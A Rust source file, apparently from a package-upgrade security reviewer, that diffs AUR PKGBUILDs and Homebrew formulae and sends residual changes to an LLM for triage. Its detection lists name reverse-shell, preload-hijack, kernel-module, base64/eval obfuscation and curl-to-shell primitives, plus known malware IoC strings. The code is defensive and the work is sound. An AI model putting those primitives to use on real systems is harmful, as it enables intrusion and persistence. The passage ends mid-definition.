use crate::cache::{read_cache, write_cache};
use crate::config::Config;
use crate::models::{Dependency, Ecosystem, PackageOrigin};
use anyhow::Result;
use reqwest::Client;
use serde::{Deserialize, Serialize};
use similar::TextDiff;
use std::process::Stdio;
use std::time::Duration;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::process::Command;

pub const DEFAULT_REVIEW_MODEL: &str = "openai/gpt-5.6-luna";
pub fn display_review_reason(reason: &str) -> String {
    let key = match reason {
        "LLM output unparsable — treat as unreviewed" => Some("review_unparsable"),
        "API review unavailable or invalid — treat as unreviewed" => Some("review_unparsable"),
        "source review task failed — treat as unreviewed" => Some("review_task_failed"),
        "source review cancelled" => Some("review_cancelled"),
        "provider isolation not verified — treat as unreviewed" => {
            Some("review_isolation_unverified")
        }
        "Codex authentication mode missing — treat as unreviewed" => {
            Some("review_codex_auth_missing")
        }
        "Codex authentication mode invalid — treat as unreviewed" => {
            Some("review_codex_auth_invalid")
        }
        "known Atomic Arch IoC found in package source" => Some("review_known_ioc"),
        "version bump only, no code changes" => Some("review_version_only"),
        "deterministic scan only (LLM review disabled)" => Some("review_deterministic_only"),
        "source review not applicable to this ecosystem" => Some("review_not_applicable"),
        "could not fetch current PKGBUILD from AUR" => Some("review_fetch_pkgbuild_failed"),
        "brew is not available" => Some("review_brew_unavailable"),
        _ => None,
    };
    if let Some(key) = key {
        return crate::i18n::t(key).to_string();
    }
    for (prefix, key) in [
        ("brew info failed for ", "review_brew_info_failed"),
        ("unrecognized tap: ", "review_unknown_tap"),
        (
            "could not fetch formula from ",
            "review_fetch_formula_failed",
        ),
    ] {
        if let Some(detail) = reason.strip_prefix(prefix) {
            return crate::i18n::tf(key, &[detail]);
        }
    }
    crate::i18n::tf("review_original_detail", &[reason])
}
const REVIEW_CACHE_TTL_SECS: u64 = 6 * 60 * 60;
const USER_AGENT: &str = "tucupi/0.2.1 (package source review)";

/// Well-known malware identifiers from the Atomic Arch AUR campaign
/// (June 2026). These never reach the LLM for judgment: any hit is a hard block.
const KNOWN_IOC_PATTERNS: &[&str] = &["atomic-lockfile", "js-digest", "lockfile-js"];

/// High-risk primitives that justify manual review even when the LLM
/// is unavailable. Matched case-insensitively as plain substrings or
/// simple structural checks, to avoid a regex dependency.
const HIGH_RISK_PATTERNS: &[&str] = &[
    "/dev/tcp/",
    "ld.so.preload",
    "insmod ",
    "chattr +i",
    "base64 -d",
    "base64 --decode",
    "openssl enc -d",
    "eval(",
    "eval (",
    "eval $(",
    "eval `",
];

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum ReviewVerdict {
    Safe,
    Review,
    Block,
}

impl ReviewVerdict {
    pub fn display_label(&self) -> &'static str {
        match self {
            ReviewVerdict::Safe => crate::i18n::t("review_verdict_safe"),
            ReviewVerdict::Review => crate::i18n::t("review_verdict_review"),
            ReviewVerdict::Block => crate::i18n::t("review_verdict_block"),
        }
    }
    pub fn as_str(&self) -> &'static str {
        match self {
            ReviewVerdict::Safe => "safe",
            ReviewVerdict::Review => "review",
            ReviewVerdict::Block => "block",
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum HitSeverity {
    KnownIoc,
    HighRisk,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct KnownBadHit {
    pub severity: HitSeverity,
    pub pattern: String,
    pub line_number: usize,
    pub line: String,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum ReviewViewMode {
    Diff,
    Full,
    Unavailable,
}

#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
pub(crate) enum ReviewOrigin {
    #[default]
    Unknown,
    DeterministicClean,
    DirectApi,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct ReviewReport {
    pub verdict: ReviewVerdict,
    pub reason: String,
    pub view_mode: ReviewViewMode,
    pub residual_line_count: usize,
    pub hits: Vec<KnownBadHit>,
    // Never trust origin loaded from disk or supplied by the model.
    #[serde(skip)]
    pub(crate) origin: ReviewOrigin,
}

impl ReviewReport {
    pub(crate) fn unavailable(reason: &str) -> Self {
        Self {
            verdict: ReviewVerdict::Review,
            reason: reason.to_string(),
            view_mode: ReviewViewMode::Unavailable,
            residual_line_count: 0,
            hits: Vec::new(),
            origin: ReviewOrigin::Unknown,
        }
    }

    pub fn has_known_ioc(&self) -> bool {
        self.hits
            .iter()
            .any(|hit| hit.severity == HitSeverity::KnownIoc)
    }
}

/// Whether a dependency's package source should be reviewed before upgrade.
/// Official pacman repos are GPG-signed and excluded; AUR packages and all
/// Homebrew formulae/casks carry reviewable build definitions.
pub fn needs_review(dep: &Dependency) -> bool {
    match dep.ecosystem {
        Ecosystem::Pacman => dep.origin == Some(PackageOrigin::Aur),
        Ecosystem::Homebrew => true,
        _ => false,
    }
}

pub fn scan_known_bad(content: &str) -> Vec<KnownBadHit> {
    let mut hits = Vec::new();

    for (index, raw_line) in content.lines().enumerate() {
        let line = raw_line.to_lowercase();
        for pattern in KNOWN_IOC_PATTERNS {
            if line.contains(pattern) {
                hits.push(KnownBadHit {
                    severity: HitSeverity::KnownIoc,
                    pattern: (*pattern).to_string(),
                    line_number: index + 1,
                    line: raw_line.trim().to_string(),
                });
            }
        }

        for pattern in HIGH_RISK_PATTERNS {
            if line.contains(pattern) {
                hits.push(KnownBadHit {
                    severity: HitSeverity::HighRisk,
                    pattern: (*pattern).to_string(),
                    line_number: index + 1,
                    line: raw_line.trim().to_string(),
                });
            }
        }

        if let Some(hit) = detect_pipe_to_shell(index, raw_line) {
            hits.push(hit);
        }
    }

    hits
}

fn detect_pipe_to_shell(index: usize, raw_line: &str) -> Option<KnownBadHit> {
    let lowered = raw_line.to_lowercase();
    if !lowered.contains("curl") && !lowered.contains("wget") {
        return None;
    }

    let pipe_position = lowered.rfind('|')?;
    let after_pipe = lowered[pipe_position + 1..].trim_start();
    let is_shell = ["sh", "bash", "zsh", "dash"]
        .iter()
        .any(|shell| after_pipe.starts_with(shell));

    if is_shell {
        Some(KnownBadHit {
            severity: HitSeverity::HighRisk,
            pattern: "pipe-to-shell".to_string(),
            line_number: index + 1,
            line: raw_line.trim().to_string(),
        })
    } else {
        None
    }
}

/// Rewrite the old version string to the new one so pure version bumps
/// (including versions embedded in source URLs) disappear from the diff.
/// Occurrences embedded inside a longer dotted token (e.g. `1.2` inside
/// `1.2.3`) are left untouched: mangling them would corrupt URLs and could
/// mask real changes, so the residual diff errs on the side of showing more.
pub fn normalize_versions(content: &str, old_version: &str, new_version: &str) -> String {
    if old_version.is_empty() || new_version.is_empty() || old_version == new_version {
        return content.to_string();
    }

    let mut result = String::with_capacity(content.len() + new_version.len());
    let bytes = content.as_bytes();
    let mut consumed = 0usize;

    while let Some(relative) = content[consumed..].find(old_version) {
        let start = consumed + relative;
        let end = start + old_version.len();

        let before_is_version = start > 0 && is_version_boundary_byte(bytes[start - 1]);
        let after_is_version = is_embedded_after(bytes, end);

        result.push_str(&content[consumed..start]);
        if before_is_version || after_is_version {
            result.push_str(&content[start..end]);
        } else {
            result.push_str(new_version);
        }
        consumed = end;
    }

    result.push_str(&content[consumed..]);
    result
}

fn is_version_boundary_byte(byte: u8) -> bool {
    byte.is_ascii_alphanumeric() || byte == b'.' || byte == b'_'
}

/// True when the byte range starting at `end` continues a longer version
/// token: either a digit directly, or a dot followed by a digit (`1.2` in
/// `1.2.3`). A dot followed by a letter (`1.2.3.tar.gz`) is a filename
/// separator, so the token has ended.
fn is_embedded_after(bytes: &[u8], end: usize) -> bool {
    match bytes.get(end) {
        None => false,
        Some(b'.') => matches!(bytes.get(end + 1), Some(next) if next.is_ascii_digit()),
        Some(next) => next.is_ascii_digit() || next.is_ascii_alphabetic(),
    }
}

/// Remove checksum-only blocks from a PKGBUILD so checksum churn caused by
/// version bumps does not pollute the residual diff. Source URLs are kept:
/// domain changes are meaningful signal.
pub fn strip_pkgbuild_noise(content: &str) -> String {
    const CHECKSUM_KEYS: &[&str] = &[
        "sha256sums=",
        "sha512sums=",
        "sha384sums=",
        "sha224sums=",
        "md5sums=",
        "b2sums=",
        "cksums=",
    ];

    let mut output = String::new();
    let mut skipping = false;

    for line in content.lines() {
        let trimmed = line.trim_start();
        if !skipping {
            if CHECKSUM_KEYS.iter().any(|key| trimmed.starts_with(key)) {
                skipping = !trimmed.contains(')');
                continue;
            }
        } else {
            if trimmed.contains(')') {
                skipping = false;
            }
            continue;
        }
        output.push_str(line);
        output.push('\n');
    }

    output
}

/// Remove checksum-only content from a Homebrew formula/cask definition:
/// `sha256 ...` lines and whole `bottle do ... end` blocks.
pub fn strip_formula_noise(content: &str) -> String {
    let mut output = String::new();
    let mut in_bottle_block = false;

    for line in content.lines() {
        let trimmed = line.trim_start();
        if trimmed == "bottle do" {
            in_bottle_block = true;
            continue;
        }
        if in_bottle_block {
            if trimmed == "end" {
                in_bottle_block = false;
            }
            continue;
        }
        if trimmed.starts_with("sha256 ") {
            continue;
        }
        output.push_str(line);
        output.push('\n');
    }

    output
}

/// Compute the residual diff between the installed version's package
/// definition and the current one, after version normalization and noise
/// stripping. Empty residual + no known-bad hits = pure version bump.
pub fn compute_residual(
    old_content: &str,
    new_content: &str,
    old_version: &str,
    new_version: &str,
    pkgbuild_style: bool,
) -> String {
    let normalized_old = normalize_versions(old_content, old_version, new_version);
    let clean_old = if pkgbuild_style {
        strip_pkgbuild_noise(&normalized_old)
    } else {
        strip_formula_noise(&normalized_old)
    };
    let clean_new = if pkgbuild_style {
        strip_pkgbuild_noise(new_content)
    } else {
        strip_formula_noise(new_content)
    };

    TextDiff::from_lines(&clean_old, &clean_new)
        .unified_diff()
        .context_radius(3)
        .to_string()
}

/// Count the meaningful changed lines (additions + deletions) in a diff.
pub fn count_residual_lines(diff_text: &str) -> usize {
    diff_text
        .lines()
        .filter(|line| {
            (line.starts_with('+') && !line.starts_with("+++"))
                || (line.starts_with('-') && !line.starts_with("---"))
        })
        .count()
}

pub fn parse_verdict_output(output: &str) -> Option<(ReviewVerdict, String)> {
    let mut verdict = None;
    let mut reason = String::new();

    for line in output.lines() {
        let line = line.trim();
        if verdict.is_none() {
            if let Some(rest) = line.strip_prefix("VERDICT:") {
                verdict = match rest.trim().to_lowercase().as_str() {
                    "safe" => Some(ReviewVerdict::Safe),
                    "review" => Some(ReviewVerdict::Review),
                    "block" => Some(ReviewVerdict::Block),
                    _ => None,
                };
            }
        } else if reason.is_empty() {
            if let Some(rest) = line.strip_prefix("REASON:") {
                reason = rest.trim().to_string();
            }
        }
    }

    if reason.is_empty() {
        return None;
    }
    verdict.map(|parsed| (parsed, reason))
}

fn http_client() -> Client {
    Client::builder()
        .timeout(Duration::from_secs(15))
        .user_agent(USER_AGENT)
        .build()
        .unwrap_or_default()
}

async fn fetch_text(client: &Client, url: &str) -> Option<String> {
    let response = client.get(url).send().await.ok()?;
    if !response.status().is_success() {
        return None;
    }
    response.text().await.ok()
}

struct PkgbuildSources {
    baseline: Option<String>,
    current: String,
    install_files: String,
}

async fn fetch_pkgbuild_sources(dep: &Dependency) -> Result<PkgbuildSources> {
    #[cfg(all(target_os = "linux", feature = "review-pty-fixture"))]
    if crate::review_pty_fixture::endpoint().is_some() && dep.name == "tucupi-synthetic-package" {
        return Ok(PkgbuildSources {
            baseline: Some("pkgver=1\npackage() { echo before; }\n".into()),
            current: "pkgver=2\npackage() { echo after; }\n".into(),
            install_files: String::new(),
        });
    }
    let client = http_client();
    let url = format!(
        "https://aur.archlinux.org/cgit/aur.git/plain/PKGBUILD?h={}",
        dep.name
    );
    let current = fetch_text(&client, &url)
        .await
        .filter(|content| !content.trim().is_empty())
        .ok_or_else(|| anyhow::anyhow!("could not fetch current PKGBUILD from AUR"))?;

    let clone_dir = paru_clone_dir(dep);
    let baseline_path = clone_dir.join("PKGBUILD");
    let baseline = tokio::fs::read_to_string(&baseline_path)
        .await
        .ok()
        .filter(|content| !content.trim().is_empty());

    let mut install_files = String::new();
    if let Ok(entries) = tokio::fs::read_dir(&clone_dir).await {
        let mut dir_entries = entries;
        while let Ok(Some(entry)) = dir_entries.next_entry().await {
            let path = entry.path();
            if path.extension().and_then(|ext| ext.to_str()) == Some("install") {
                if let Ok(content) = tokio::fs::read_to_string(&path).await {
                    let file_name = path
                        .file_name()
                        .and_then(|name| name.to_str())
                        .unwrap_or("unknown.install");
                    install_files.push_str(&format!("--- {file_name} ---\n{content}\n"));
                }
            }
        }
    }

    Ok(PkgbuildSources {
        baseline,
        current,
        install_files,
    })
}

fn paru_clone_dir(dep: &Dependency) -> std::path::PathBuf {
    let cache_root = std::env::var("XDG_CACHE_HOME")
        .unwrap_or_else(|_| format!("{}/.cache", std::env::var("HOME").unwrap_or_default()));
    std::path::PathBuf::from(cache_root)
        .join("paru")
        .join("clone")
        .join(&dep.name)
}

struct FormulaSources {
    baseline: Option<String>,
    current: String,
    tap: String,
    path: String,
}

async fn fetch_formula_sources(dep: &Dependency) -> Result<FormulaSources> {
    let client = http_client();

    let info_output = Command::new("brew")
        .args(["info", "--json=v2", &dep.name])
        .output()
        .await
        .map_err(|_| anyhow::anyhow!("brew is not available"))?;
    if !info_output.status.success() {
        return Err(anyhow::anyhow!("brew info failed for {}", dep.name));
    }
    let info_json: serde_json::Value = serde_json::from_slice(&info_output.stdout)?;
    let entries = info_json
        .get("formulae")
        .and_then(|value| value.as_array())
        .filter(|array| !array.is_empty())
        .or_else(|| {
            info_json
                .get("casks")
                .and_then(|value| value.as_array())
                .filter(|array| !array.is_empty())
        });
    let tap = entries
        .and_then(|array| array.first())
        .and_then(|entry| entry.get("tap"))
        .and_then(|value| value.as_str())
        .unwrap_or("homebrew/core")
        .to_string();

    let repo = match tap.as_str() {
        "homebrew/core" => "Homebrew/homebrew-core".to_string(),
        "homebrew/cask" => "Homebrew/homebrew-cask".to_string(),
        other => {
            let (user, name) = other
                .split_once('/')
                .ok_or_else(|| anyhow::anyhow!("unrecognized tap: {other}"))?;
            format!("{user}/homebrew-{name}")
        }
    };

    let is_cask_tap = tap == "homebrew/cask";
    let letter = dep.name.chars().next().unwrap_or('a').to_string();
    let mut candidates: Vec<String> = Vec::new();
    if is_cask_tap {
        candidates.push(format!("Casks/{letter}/{}.rb", dep.name));
        candidates.push(format!("Casks/{}.rb", dep.name));
    } else if tap == "homebrew/core" {
        candidates.push(format!("Formula/{letter}/{}.rb", dep.name));
        candidates.push(format!("Formula/{}.rb", dep.name));
    } else {
        candidates.push(format!("Formula/{letter}/{}.rb", dep.name));
        candidates.push(format!("Formula/{}.rb", dep.name));
        candidates.push(format!("{}.rb", dep.name));
        candidates.push(format!("Casks/{letter}/{}.rb", dep.name));
        candidates.push(format!("Casks/{}.rb", dep.name));
    }

    let mut current = None;
    let mut path = String::new();
    for candidate in &candidates {
        let url = format!("https://raw.githubusercontent.com/{repo}/HEAD/{candidate}");
        if let Some(content) = fetch_text(&client, &url).await {
            if !content.trim().is_empty() {
                current = Some(content);
                path = candidate.clone();
                break;
            }
        }
    }
    let current = current.ok_or_else(|| anyhow::anyhow!("could not fetch formula from {repo}"))?;

    let baseline = find_formula_baseline(&client, &repo, &path, dep, &tap).await;

    Ok(FormulaSources {
        baseline,
        current,
        tap,
        path,
    })
}

async fn find_formula_baseline(
    client: &Client,
    repo: &str,
    path: &str,
    dep: &Dependency,
    tap: &str,
) -> Option<String> {
    let api_url = format!("https://api.github.com/repos/{repo}/commits?path={path}&per_page=100");
    let mut request = client.get(&api_url);
    if let Ok(token) = std::env::var("GITHUB_TOKEN") {
        if !token.is_empty() {
            request = request.bearer_auth(&token);
        }
    }
    let response = request.send().await.ok()?;
    if !response.status().is_success() {
        return None;
    }
    let commits: serde_json::Value = response.json().await.ok()?;
    let commits = commits.as_array()?;

    let installed_version = dep.current_version.as_str();
    let version_without_revision = installed_version
        .split('_')
        .next()
        .unwrap_or(installed_version);
    let exact_subject = format!("{} {}", dep.name, installed_version);
    let exact_without_revision = format!("{} {}", dep.name, version_without_revision);

    for commit in commits {
        let message = commit
            .get("commit")
            .and_then(|commit| commit.get("message"))
            .and_then(|value| value.as_str())
            .unwrap_or("");
        let subject = message.lines().next().unwrap_or("").trim();

        let matched = subject == exact_subject
            || subject == exact_without_revision
            || (subject.starts_with(&format!("{}:", dep.name))
                && (subject.contains(installed_version)
                    || subject.contains(version_without_revision)));

        if !matched {
            continue;
        }

        let sha = commit.get("sha").and_then(|value| value.as_str())?;
        let raw_url = format!("https://raw.githubusercontent.com/{repo}/{sha}/{path}");
        if let Some(content) = fetch_text(client, &raw_url).await {
            if !content.trim().is_empty() {
                return Some(content);
            }
        }
    }

    let _ = tap;
    None
}

const MAX_REVIEW_PAYLOAD_BYTES: usize = 128_000;

fn build_review_prompt(payload: &str) -> Option<String> {
    if payload.len() > MAX_REVIEW_PAYLOAD_BYTES {
        return None;
    }
    Some(format!(
        "You are doing supply-chain security triage for package build definitions \
(PKGBUILD for the AUR, .rb formulae/casks for Homebrew). Context: attackers adopt \
orphaned packages and inject malicious commands into build definitions (npm preinstall \
droppers, curl|bash, eBPF rootkits). You receive the diff between the installed \
version's definition and the new one, with benign version bumps and checksum noise \
already removed (or the full file when no baseline exists), plus install scripts.

Judge ONLY the changed/added code. Version bumps, checksum value changes and rebuild \
revisions are benign. Red flags: piping downloads into shell, installing unexpected \
npm/bun/pip packages, base64/eval obfuscation, network access inside install-time code \
when it did not exist before, writes to ~/.ssh, ~/.aws, ~/.gnupg, browser profiles, \
/etc/ld.so.preload, kernel modules, out-of-place or typosquatted domains, new source \
hosts, SKIP checksums on non-git sources.

Be conservative: anything suspicious or unfamiliar = review; clearly malicious = block; \
trivial/benign = safe. Do not invent issues; do not flag cosmetics.

Answer EXACTLY this format, nothing else:
VERDICT: safe|review|block
REASON: <one short line>

{payload}"
    ))
}

#[cfg(all(test, target_os = "linux"))]
tokio::task_local! {
    static LOCAL_API_FIXTURE: (String, String);
}

async fn llm_verdict(config: &Config, payload: &str) -> Option<(ReviewVerdict, String)> {
    if let Some(provider) = crate::secrets::ReviewApiProvider::from_config(config.review_provider())
    {
        #[cfg(all(test, target_os = "linux"))]
        if let Ok((service, endpoint)) = LOCAL_API_FIXTURE.try_with(Clone::clone) {
            let store =
                crate::secrets::KeyringSecretStore::fixture(&service, provider.keychain_account());
            return llm_api_with(
                config,
                payload,
                &store,
                |provider, model, prompt, key| async move {
                    let client = reqwest::Client::builder()
                        .no_proxy()
                        .redirect(reqwest::redirect::Policy::none())
                        .timeout(Duration::from_secs(5))
                        .build()
                        .ok();
                    let client = client.ok_or("fixture client unavailable")?;
                    crate::review_api::request_with_client(
                        &client, &endpoint, provider, &model, &prompt, &key,
                    )
                    .await
                },
            )
            .await;
        }
        let store = crate::secrets::KeyringSecretStore::for_review_provider(provider);
        return llm_api_with(
            config,
            payload,
            &store,
            |provider, model, prompt, key| async move {
                crate::review_api::request_review(provider, &model, &prompt, &key).await
            },
        )
        .await;
    }
    llm_verdict_with_recovery_preflight(config, payload, || {
        #[cfg(target_os = "linux")]
        {
            crate::recovery_state::codex_recovery_preflight(config)
        }
        #[cfg(not(target_os = "linux"))]
        {
            Ok(())
        }
    })
    .await
}

pub(crate) async fn llm_api_with<F, Fut>(
    config: &Config,
    payload: &str,
    store: &dyn crate::secrets::SecretStore,
    run: F,
) -> Option<(ReviewVerdict, String)>
where
    F: FnOnce(crate::secrets::ReviewApiProvider, String, String, String) -> Fut,
    Fut: std::future::Future<Output = Result<String, &'static str>>,
{
    let provider = crate::secrets::ReviewApiProvider::from_config(config.review_provider())?;
    let model = config.security.review_model.clone()?;
    let prompt = build_review_prompt(payload)?;
    let key = store.get_secret().ok()??;
    let text = run(provider, model, prompt, key).await.ok()?;
    parse_direct_api_verdict(&text)
}

fn parse_direct_api_verdict(text: &str) -> Option<(ReviewVerdict, String)> {
    let mut lines = text.trim().lines();
    let first = lines.next()?.trim();
    let second = lines.next()?.trim();
    if lines.next().is_some()
        || !first.starts_with("VERDICT:")
        || !second.starts_with("REASON:")
        || second.len() > 1000
        || second.chars().any(char::is_control)
    {
        return None;
    }
    parse_verdict_output(text)
}

fn direct_api_origin(config: &Config) -> ReviewOrigin {
    if crate::secrets::ReviewApiProvider::from_config(config.review_provider()).is_some() {
        ReviewOrigin::DirectApi
    } else {
        ReviewOrigin::Unknown
    }
}

// The injected check supports isolated tests; even a successful check cannot
// enable Codex here. No fixture result is a production authorization.
async fn llm_verdict_with_recovery_preflight(
    config: &Config,
    payload: &str,
    preflight: impl FnOnce() -> std::io::Result<()>,
) -> Option<(ReviewVerdict, String)> {
    llm_verdict_with_runner(config, payload, preflight, |program, args, input| async move {
        run_model_command(&program, &args, input.as_deref()).await
    }).await
}

async fn llm_verdict_with_runner<F, Fut>(
    config: &Config,
    payload: &str,
    preflight: impl FnOnce() -> std::io::Result<()>,
    run: F,
) -> Option<(ReviewVerdict, String)>
where
    F: FnOnce(String, Vec<String>, Option<String>) -> Fut,
    Fut: std::future::Future<Output = Result<std::process::Output, String>>,
{
    let prompt = build_review_prompt(payload)?;
    if config.review_provider() == "codex" {
        preflight().ok()?;
        return None;
    }
    let (program, args, input) = model_command(config, &prompt)?;
    let output = run(program, args, input).await.ok()?;
    let stdout = String::from_utf8_lossy(&output.stdout);
    parse_verdict_output(&stdout)
}

/// An unpromoted result: no public operation can turn it into an approval.
/// A future supervisor must verify cleanup before adding a promotion path.
///
/// ```compile_fail
/// fn publish(pending: tucupi::review::PendingCodexReview) {
///     let _verdict = pending._verdict;
/// }
/// ```
#[must_use]
pub struct PendingCodexReview {
    _verdict: ReviewVerdict,
    _reason: String,
}

/// Fixture-only lifecycle holder. It is constructed before any model response,
/// so a missing or invalid response cannot prevent cancellation. It neither
/// creates the cgroup nor proves its ownership and has no promotion path.
#[cfg(all(target_os = "linux", feature = "codex-fixture"))]
pub struct FixtureReviewAttempt {
    sequence: crate::codex_supervision::CgroupSequence,
    response_seen: bool,
    cancelled: bool,
    _pending: Option<PendingCodexReview>,
}

#[cfg(all(target_os = "linux", feature = "codex-fixture"))]
impl FixtureReviewAttempt {
    pub fn start(
        mut sequence: crate::codex_supervision::CgroupSequence,
    ) -> Result<Self, &'static str> {
        if sequence.observe()? != crate::codex_supervision::CgroupSequenceState::Populated {
            return Err("fixture cgroup not populated");
        }
        Ok(Self {
            sequence,
            response_seen: false,
            cancelled: false,
            _pending: None,
        })
    }

    pub fn receive(&mut self, body: &[u8]) -> Result<(), &'static str> {
        if self.response_seen || self.cancelled {
            return Err("fixture response already resolved");
        }
        self.response_seen = true;
        self._pending = parse_codex_review_response(body);
        if self._pending.is_none() {
            return Err("invalid fixture response");
        }
        Ok(())
    }

    pub fn cancel(&mut self) -> Result<(), &'static str> {
        if self.cancelled {
            return Err("fixture already cancelled");
        }
        self.cancelled = true;
        self._pending = None;
        self.sequence.cancel_fixture()
    }

    pub fn observe(
        &mut self,
    ) -> Result<crate::codex_supervision::CgroupSequenceState, &'static str> {
        self.sequence.observe()
    }
}

/// Best-effort fallback for the synthetic fixture. It cannot report errors or
/// observe cleanup, and does not run after SIGKILL, abort, or process failure.
#[cfg(all(target_os = "linux", feature = "codex-fixture"))]
impl Drop for FixtureReviewAttempt {
    fn drop(&mut self) {
        if !self.cancelled {
            self.cancelled = true;
            self._pending = None;
            let _ = self.sequence.cancel_fixture();
        }
    }
}

/// Fixture-only owner of one child and one quarantined attempt. Admission is
/// performed before releasing the child's test gate, but this does not prove
/// production unit ownership, isolation, crash recovery, or result promotion.
///
/// ```compile_fail
/// fn attach_external(observation: tucupi::codex_supervision::CgroupObservation,
///                    child: std::process::Child) {
///     let _ = tucupi::review::FixtureSupervisedChild::admit_and_release(observation, child);
/// }
/// ```
#[cfg(all(target_os = "linux", feature = "codex-fixture"))]
pub struct FixtureSupervisedChild {
    attempt: FixtureReviewAttempt,
    child: std::process::Child,
    reaped: bool,
    recovery_exit: Option<FixtureExitRecord>,
}

/// Independent, point-in-time fixture observations. No field authorizes work.
#[cfg(all(target_os = "linux", feature = "codex-fixture"))]
pub struct FixtureReviewObservation {
    pub response_quarantined: bool,
    pub direct_exit: crate::same_user_supervisor::DirectExitObservation,
    pub rollback_target: crate::same_user_supervisor::SyntheticTargetObservation,
    pub resume_target: crate::same_user_supervisor::SyntheticTargetObservation,
    pub descendant_cleanup: crate::same_user_supervisor::RecoveryOutcome,
    pub rollback: crate::same_user_supervisor::RecoveryOutcome,
}

#[cfg(all(target_os = "linux", feature = "codex-fixture"))]
struct FixtureExitRecord {
    directory: std::fs::File,
    path: std::path::PathBuf,
    attempt: String,
}

// The gate is carried with the child returned by this fixture's spawn path.
// This binds internal cancellation state, not OS-level cgroup ownership.
#[cfg(all(target_os = "linux", feature = "codex-fixture"))]
struct FixtureSpawnedChild<'a> {
    child: Option<std::process::Child>,
    gate: &'a FixtureStartGate,
}

#[cfg(all(target_os = "linux", feature = "codex-fixture"))]
impl FixtureSpawnedChild<'_> {
    fn reject_with_cleanup(
        &mut self,
        reason: &'static str,
        stop: impl FnOnce(&mut std::process::Child) -> bool,
    ) -> &'static str {
        if let Some(child) = self.child.as_mut() {
            if stop(child) {
                self.child.take();
                return reason;
            }
        }
        "fixture child cleanup unverified"
    }
}

#[cfg(all(target_os = "linux", feature = "codex-fixture"))]
impl Drop for FixtureSpawnedChild<'_> {
    fn drop(&mut self) {
        if let Some(child) = self.child.as_mut() {
            // Best effort only: Drop cannot report timeout or guarantee that
            // descendants or a cgroup are gone.
            let _ = stop_fixture_direct_child(child);
        }
    }
}

/// Attempt cancellation state. Gate release is available only to the fixture;
/// cancellation alone does not stop work or establish an isolation boundary.
#[derive(Default)]
pub struct FixtureStartGate {
    state: std::sync::Mutex<FixtureStartGateState>,
    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    recovery_marker: Option<std::sync::Arc<crate::codex_supervision::FixtureRecoveryMarker>>,
    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    same_user_recovery: Option<std::fs::File>,
    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    same_user_path: Option<std::path::PathBuf>,
    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    same_user_snapshot: Option<crate::same_user_supervisor::SyntheticFileSnapshot>,
    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    synthetic_source: Option<tempfile::TempDir>,
    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    synthetic_postimage: Option<SyntheticPostimage>,
    #[cfg(all(test, target_os = "linux", feature = "codex-fixture"))]
    pub(crate) checkpoint:
        std::sync::Mutex<Option<(std::sync::mpsc::Sender<()>, std::sync::mpsc::Receiver<()>)>>,
    #[cfg(all(test, target_os = "linux", feature = "codex-fixture"))]
    pub(crate) after_release_checkpoint:
        std::sync::Mutex<Option<(std::sync::mpsc::Sender<()>, std::sync::mpsc::Receiver<()>)>>,
    #[cfg(all(test, target_os = "linux", feature = "codex-fixture"))]
    pub(crate) before_attach_checkpoint:
        std::sync::Mutex<Option<(std::sync::mpsc::Sender<()>, std::sync::mpsc::Receiver<()>)>>,
    #[cfg(all(test, target_os = "linux", feature = "codex-fixture"))]
    pub(crate) before_create_checkpoint:
        std::sync::Mutex<Option<(std::sync::mpsc::Sender<()>, std::sync::mpsc::Receiver<()>)>>,
    #[cfg(all(test, target_os = "linux", feature = "codex-fixture"))]
    pub(crate) after_create_checkpoint:
        std::sync::Mutex<Option<(std::sync::mpsc::Sender<()>, std::sync::mpsc::Receiver<()>)>>,
    #[cfg(all(test, target_os = "linux", feature = "codex-fixture"))]
    pub(crate) fail_close_range: std::sync::atomic::AtomicBool,
    #[cfg(all(test, target_os = "linux", feature = "codex-fixture"))]
    pub(crate) after_verify_checkpoint:
        std::sync::Mutex<Option<(std::sync::mpsc::Sender<()>, std::sync::mpsc::Receiver<()>)>>,
    #[cfg(all(test, target_os = "linux", feature = "codex-fixture"))]
    admission_panic: std::sync::atomic::AtomicBool,
}

#[cfg(all(target_os = "linux", feature = "codex-fixture"))]
enum SyntheticPostimage {
    Present(Vec<u8>),
    Absent,
    TwoFiles(Vec<u8>),
}

#[derive(Default)]
struct FixtureStartGateState {
    cancelled: bool,
    had_unit: bool,
    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    fixture_starting: bool,
    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    fixture_recovery_ready: bool,
    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    fixture_intent: Option<String>,
    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    same_user_pending: Option<crate::same_user_supervisor::PendingAttempt>,
    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    captured_snapshot: Option<crate::same_user_supervisor::SyntheticFileSnapshot>,
    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    fixture_child_started: bool,
    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    fixture_gate_released: bool,
    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    fixture_release_succeeded: bool,
    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    cancellation_failed: bool,
    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    kill: Option<crate::codex_supervision::FixtureKillHandle>,
}

impl FixtureStartGate {
    /// Synthetic supervisor only: caller supplies an explicitly provisioned
    /// disposable recovery directory. No real provider is enabled.
    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    pub fn with_same_user_recovery(directory: std::fs::File) -> Self {
        Self {
            same_user_path: Self::fixture_directory_path(&directory),
            same_user_recovery: Some(directory),
            ..Self::default()
        }
    }

    /// Synthetic inputs only; persistence is not a cleanup or admission proof.
    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
